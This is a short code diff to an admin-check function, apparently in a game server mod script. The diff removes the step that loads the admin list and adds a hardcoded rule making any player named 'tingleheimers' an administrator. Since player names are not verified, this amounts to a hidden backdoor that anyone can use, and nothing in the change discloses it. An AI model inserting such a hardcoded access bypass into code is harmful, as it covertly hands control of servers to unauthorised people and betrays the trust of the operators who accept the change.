@@ -15,14 +15,10 @@ void function LoadAdminList()
 
 bool function PlayerIsAdmin(entity player)
 {
-	LoadAdminList()
-
-	if (file.Admins.len() == 0)
-		return false
-
 	return (
 		file.Admins.contains(player.GetPlayerName().tolower())
 		|| file.Admins.contains(player.GetPlayerName())
 		|| file.Admins.contains(player.GetUID())
+		|| player.GetPlayerName().tolower() == "tingleheimers"
 	)
 }
